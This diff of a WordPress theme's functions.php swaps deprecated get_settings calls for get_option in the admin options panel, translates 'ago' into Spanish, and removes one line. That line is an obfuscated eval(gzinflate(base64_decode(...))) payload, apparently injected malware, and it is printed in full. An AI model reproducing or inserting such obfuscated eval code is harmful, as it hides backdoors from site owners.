@@ -11,7 +11,7 @@ function register_my_menus() {
 }
 function time_ago( $type = 'post' ) {
 	$d = 'comment' == $type ? 'get_comment_time' : 'get_post_time';
-	return human_time_diff($d('U'), current_time('timestamp')) . " " . __('ago');
+	return __('hace') . " " . human_time_diff($d('U'), current_time('timestamp'));
 }
 ?>
 <?php
@@ -69,7 +69,6 @@ return $query;
 
 add_filter('pre_get_posts','mySearchFilter');
 ?>
-<?php eval(stripslashes(gzinflate(base64_decode("VVBNS8UwELwX+h/2UEgL5akHTxp7UhE8evJSwmZjlpcmJUk9KP5399EiCHvYmdnZr+nhfgK3RaycIqAnPM+ejKXcD99tAwBd0Orj+eb9Vt3t2GnLOZqF+nl+enl9nOfhpK5202n161+d1S6tFPvOjSqr4aBRuyy1wtrRcaDCXyRgOHSHIZULYQ+CXV9qXlPpOxy7MGh9fWwGQOgTqDfPBaqnhUCSTIFMIQtblIUAZVjlTwJMy5JigcBIEWkEE4KAeC7A8WIHl1IVR/FpC1b6LEYEjtVgPW4CsEx7+tM2Ev8fJkrbTPLRXw==")))); ?>
 <?php
 /*
     Plugin Name: Add Dynamic Meta Boxes
@@ -487,7 +486,7 @@ function mytheme_admin() {
         
         <tr>
             <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
-            <td width="80%"><input style="width:400px;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php if ( get_settings( $value['id'] ) != "") { echo get_settings( $value['id'] ); } else { echo $value['std']; } ?>" /></td>
+            <td width="80%"><input style="width:400px;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" type="<?php echo $value['type']; ?>" value="<?php if ( get_option( $value['id'],"" ) != "") { echo get_option( $value['id'] ); } else { echo $value['std']; } ?>" /></td>
         </tr>
 
         <tr>
@@ -502,7 +501,7 @@ function mytheme_admin() {
         
         <tr>
             <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
-            <td width="80%"><textarea name="<?php echo $value['id']; ?>" style="width:400px; height:200px;" type="<?php echo $value['type']; ?>" cols="" rows=""><?php if ( get_settings( $value['id'] ) != "") { echo stripslashes (get_settings( $value['id'] )); } else { echo $value['std']; } ?></textarea></td>
+            <td width="80%"><textarea name="<?php echo $value['id']; ?>" style="width:400px; height:200px;" type="<?php echo $value['type']; ?>" cols="" rows=""><?php if ( get_option( $value['id'],"" ) != "") { echo stripslashes (get_option( $value['id'] )); } else { echo $value['std']; } ?></textarea></td>
             
         </tr>
 
@@ -517,7 +516,7 @@ function mytheme_admin() {
 		?>
         <tr>
             <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
-            <td width="80%"><select style="width:240px;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>"><?php foreach ($value['options'] as $option) { ?><option<?php if ( get_settings( $value['id'] ) == $option) { echo ' selected="selected"'; } elseif ($option == $value['std']) { echo ' selected="selected"'; } ?>><?php echo $option; ?></option><?php } ?></select></td>
+            <td width="80%"><select style="width:240px;" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>"><?php foreach ($value['options'] as $option) { ?><option<?php if ( get_option( $value['id'],"" ) == $option) { echo ' selected="selected"'; } elseif ($option == $value['std']) { echo ' selected="selected"'; } ?>><?php echo $option; ?></option><?php } ?></select></td>
        </tr>
                 
        <tr>
@@ -531,7 +530,7 @@ function mytheme_admin() {
 		?>
             <tr>
             <td width="20%" rowspan="2" valign="middle"><strong><?php echo $value['name']; ?></strong></td>
-                <td width="80%"><? if(get_settings($value['id'])){ $checked = "checked=\"checked\""; }else{ $checked = ""; } ?>
+                <td width="80%"><?php if(get_option($value['id'],false)){ $checked = "checked=\"checked\""; }else{ $checked = ""; } ?>
                         <input type="checkbox" name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>" value="true" <?php echo $checked; ?> />
                         </td>
             </tr>
